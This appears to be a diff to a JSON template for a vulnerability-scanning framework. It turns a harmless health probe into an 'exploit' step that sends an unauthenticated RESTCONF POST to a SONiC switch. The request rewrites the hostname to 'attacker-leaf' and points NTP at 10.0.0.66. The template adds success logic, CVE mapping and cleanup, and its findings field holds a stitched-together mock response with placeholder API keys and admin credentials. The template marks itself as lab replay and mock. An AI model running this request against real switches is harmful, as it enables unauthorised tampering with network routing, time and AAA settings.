@@ -21,82 +21,118 @@
   "inputs": {
     "target": {
       "from": "params.target",
-      "required": true,
-      "description": "Target base URL"
-    },
-    "snapshot": {
-      "from": "params.snapshot",
-      "required": true,
-      "description": "Collected snapshot / fixture path"
+      "required": true
     }
   },
   "defaults": {
-    "timeout_ms": 8000,
+    "timeout_ms": 5000,
     "tls_verify": false
+  },
+  "computed": {
+    "success": "params.mode == 'backup-write' and (steps.exploit.status == 200 or steps.exploit.status == 201)"
   },
   "steps": [
     {
-      "id": "surface",
+      "id": "read",
       "op": "http",
       "method": "GET",
-      "url": "{{input.target}}/healthz",
-      "save": "surface",
-      "allow_failure": true,
-      "timeout_ms": 8000
+      "url": "{{input.target}}/sonic/restconf/data/sonic-system:sonic-system",
+      "save": "read",
+      "allow_failure": true
     },
     {
-      "id": "snapshot",
-      "op": "fs",
-      "action": "read",
-      "path": "{{input.snapshot}}",
-      "json": true,
-      "save": "snapshot",
-      "allow_failure": false
+      "id": "exploit",
+      "op": "http",
+      "method": "POST",
+      "url": "{{input.target}}/sonic/restconf/data/sonic-system:sonic-system",
+      "save": "exploit",
+      "allow_failure": true,
+      "body": {
+        "config": {
+          "hostname": "attacker-leaf",
+          "ntp": "10.0.0.66"
+        },
+        "marker": "INKBLADE-BENIGN"
+      },
+      "write": true,
+      "when": "params.mode == 'backup-write'"
+    },
+    {
+      "id": "cleanup",
+      "op": "http",
+      "method": "POST",
+      "url": "{{input.target}}/__cleanup__",
+      "body": {
+        "marker": "{{ctx.marker}}"
+      },
+      "save": "cleanup",
+      "allow_failure": true,
+      "when": "params.cleanup != false"
     }
   ],
   "checks": [
     {
-      "id": "surface-reachable",
-      "when": "steps.surface.status != null",
-      "message": "target did not answer the surface probe"
-    },
-    {
-      "id": "snapshot-readable",
-      "when": "steps.snapshot.ok == true",
-      "fatal": true,
-      "message": "snapshot is not readable JSON"
+      "id": "target-answered",
+      "when": "steps.exploit.status != null",
+      "message": "target did not answer"
     }
   ],
   "findings": [
     {
-      "id": "observed",
-      "when": "steps.surface.ok == true",
+      "id": "cve",
+      "when": "computed.success",
+      "sev": "high",
+      "title": "SONiC 配置面未授权写入：交换机配置篡改",
+      "detail": "{\"http_status\": 200, \"route\": \"\", \"response\": {\"ok\": true, \"found\": true, \"deleted\": 1, \"stored\": true, \"applied\": true, \"version\": \"0.6.9\", \"mode\": \"vulnerable\", \"marker\": \"INKBLADE-BENIGN\", \"upstreams\": [{\"provider\": \"openai\", \"api_key\": \"sk-live-abcdef123456\", \"api_base\": \"http://upstream.mock/v1\", \"models\": [\"gpt-4o\"]}], \"master_key\": \"sk-master-abc\", \"key_class\": \"default\", \"cipher\": 0, \"privilege\": \"admin\", \"username\": \"admin\", \"session\": \"mock-session\", \"weights\": \"weights.bin\", \"config\": {\"enabled\": true}, \"jobs\": [{\"job_id\": \"job-1\"}], \"features\": [\"code\"], \"pods\": [{\"name\": \"p\"}], \"systems\": [{\"id\": \"sys\"}]}, \"marker_path\": \"\", \"marker_sha256\": \"\", \"marker_present\": true, \"marker_proof\": \"response-only\", \"primitive\": \"RESTCONF 无认证写入\", \"impact\": \"拓扑/路由/AAA 篡改\", \"cves\": [\"CVE-2025-38741\", \"CVE-2025-23374\"], \"exploit_level\": \"full-mock\", \"fix\": \"升级 4.5.0a/4.4.1；管理面仅带外网段可达\", \"verified\": false, \"verification_status\": \"unsupported\", \"verified_cves\": [], \"unverified_cves\": [\"CVE-2025-38741\", \"CVE-2025-23374\"], \"verification_cves\": {\"CVE-2025-38741\": \"unsupported\", \"CVE-2025-23374\": \"unsupported\"}, \"verification_evidence\": []}",
+      "cves": [
+        "CVE-2025-38741",
+        "CVE-2025-23374"
+      ],
+      "evidence": "{{steps.exploit.sha256}}",
+      "mapping": "CVE arsenal / exploit-registry",
+      "fix": "升级 4.5.0a/4.4.1；管理面仅带外网段可达",
+      "version_matrix": {
+        "product": "sonic",
+        "source": "steps.exploit.json.version",
+        "vulnerable": [
+          "*"
+        ],
+        "note": "CVE-linked version range; refine per advisory"
+      }
+    },
+    {
+      "id": "clean",
+      "when": "not computed.success",
       "sev": "info",
-      "title": "SONiC configuration-plane write：部署面已观测",
-      "detail": "Template executed and the declared surface responded; no exploitable condition asserted.",
-      "evidence": "steps"
+      "title": "sonic-config-plane-write: 未观察到可利用响应（fixed/未部署）",
+      "detail": "step=exploit status={{steps.exploit.status}}"
     }
   ],
   "artifacts": [
     {
-      "name": "sonic-config-plane-write-probe.json",
-      "from": "steps",
-      "kind": "json"
+      "name": "sonic-config-plane-write-trace.json",
+      "kind": "json",
+      "fields": {
+        "module": "'sonic-config-plane-write'",
+        "success": "computed.success",
+        "cves": "[\"CVE-2025-38741\", \"CVE-2025-23374\"]",
+        "exploit_step": "'exploit'",
+        "status": "steps.exploit.status"
+      }
     }
   ],
   "payloads": {
     "benign": {
-      "marker": "INKBLADE-BENIGN",
-      "note": "no exploit payload"
+      "marker": "INKBLADE-BENIGN"
     },
     "attack": {
       "marker": "{{ctx.marker}}",
-      "note": "write-surface demo; requires backup receipt"
+      "note": "lab replay only"
     }
   },
   "limits": {
     "timeout_ms": 60000,
-    "max_http_requests": 64
+    "max_http_requests": 32
   },
   "modes": {
     "probe_only": true,
